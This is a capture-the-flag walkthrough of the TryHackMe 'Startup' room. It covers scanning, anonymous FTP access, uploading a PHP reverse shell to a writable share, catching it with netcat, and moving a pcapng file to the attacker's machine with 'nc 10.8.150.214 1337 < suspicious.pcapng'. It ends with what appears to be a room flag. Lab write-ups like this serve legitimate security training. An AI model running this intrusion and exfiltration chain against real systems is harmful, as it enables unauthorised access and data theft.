
[Play](https://tryhackme.com/room/startup)

## 1. Enumeration & Scanning
### 1.1 Port Scanning
```
┌──(kali㉿kali)-[/tmp]
└─$ nmap -sC -sV -A 10.10.109.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 06:31 EDT
Nmap scan report for 10.10.109.61
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds
```

Anonymous login allowed ... why?

### 1.2 FTP 

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.109.61  
Connected to 10.10.109.61.
220 (vsFTPd 3.0.3)
Name (10.10.109.61:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp> get notice.txt
...
ftp> get important.jpg
...
ftp> cd ftp
...
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK. 
```

The `ftp` directory was empty. Let's look at the other two files.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

![The important.jpg image, which is an AmongUs meme](https://i.imgur.com/UEd15ea.png)

One interesting thing to note is that the `ftp` directory is also writable.


### 1.3 Web Enumeration & Exploration

![A screenshot of the website's intial page](https://i.imgur.com/xPZaCyo.png)

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -a R -u 10.10.109.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/files                (Status: 301) [Size: 312] [--> http://10.10.109.61/files/]
```

Going to the web page, we see that all of these files are hosted, which were present in ftp port. This includes the image and the notice. Recall that `ftp` is also writeable. Its very clear now that we have to upload a reverse shell.


### 1.4 Reverse Shell
Now, the question is, of what? php? Well going to `http://10.10.109.61/index.php` leads me to a "Not Found" page. Uh ... perl or something?

Let's try php rev shell anyways. Use [revshells](https://www.revshells.com/) and get one for yourself. `put` the file in `/ftp` folder. Start netcat on your specified port and ip.

## 2. Foothold
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337      
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52074
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:53:18 up 24 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1233): Inappropriate ioctl for device
bash: no job control in this shell
www-data@startup:/$ 
```

And we are in!

I tried `cd`-ing into the user, but to no avail. The ssh keys are also in palce. What to do? Hint says to look for something sus. 

### 2.1 Exploration
We find a folder named incidents. It has a single pcapng file, suspicious.pcapng. I checked if the machine has netcat, and it does. So, let's transfer the file and go in detail.


On attacked machine:
```
www-data@startup:/incidents$ nc 10.8.150.214 1337 < suspicious.pcapng   
```

On your machine:
```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 1337 > sus.pcapng  
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52080
```

Looking around in the file, we have the passowrd hidden somewhere. Try finding it XD

### 2.2 SSH
```
┌──(kali㉿kali)-[~]
└─$ ssh lennie@10.10.109.61
...
$ bash -i
lennie@startup:~$ 
```

And we are in (stably) :D

## 3. PrivEsc
Looking around, we do not really have much interesting files in the user Lennie. I also tried `lennie@startup:/$ file / -type f -perm -u=s 2>/dev/null`, which have empty results.



c4ntg3t3n0ughsp1c3